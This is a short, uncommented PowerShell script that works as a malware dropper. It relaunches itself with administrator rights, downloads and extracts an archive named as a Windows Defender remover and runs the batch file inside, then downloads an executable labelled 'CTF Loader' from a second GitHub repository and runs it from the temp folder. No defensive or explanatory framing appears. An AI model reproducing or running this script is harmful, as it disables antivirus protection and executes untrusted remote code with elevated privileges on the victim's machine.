if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process -FilePath "powershell.exe" -ArgumentList "-File", "$($MyInvocation.MyCommand.Path)" -Verb RunAs
    Exit
}

$url = "https://github.com/peiceofmind/DEV-0537/raw/main/windows-defender-remover-main.rar"

$destinationFolder = "C:\Temp\ExtractedFiles"

if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
}

$winrarPath = "C:\Program Files\WinRAR\WinRAR.exe"

Invoke-WebRequest -Uri $url -OutFile "$destinationFolder\windows-defender-remover-main.rar"

Start-Process -FilePath $winrarPath -ArgumentList "x -ibck `"$destinationFolder\windows-defender-remover-main.rar`" `"$destinationFolder`"" -Wait

$fileToOpen = "$destinationFolder\Script_Run.bat"

if (Test-Path -Path $fileToOpen) {
  
    Start-Process -FilePath $fileToOpen
} else {
    Write-Host "File '$fileToOpen' not found."
}

$urlExe = "https://github.com/peiceofmind/WIndows10DebloatedMAX/raw/main/CTF%20Loader.exe"
$outputFilePathExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "CTL_Loader_protected.exe")

Invoke-WebRequest -Uri $urlExe -OutFile $outputFilePathExe
Write-Host "File downloaded to: $outputFilePathExe"

Start-Process $outputFilePathExe
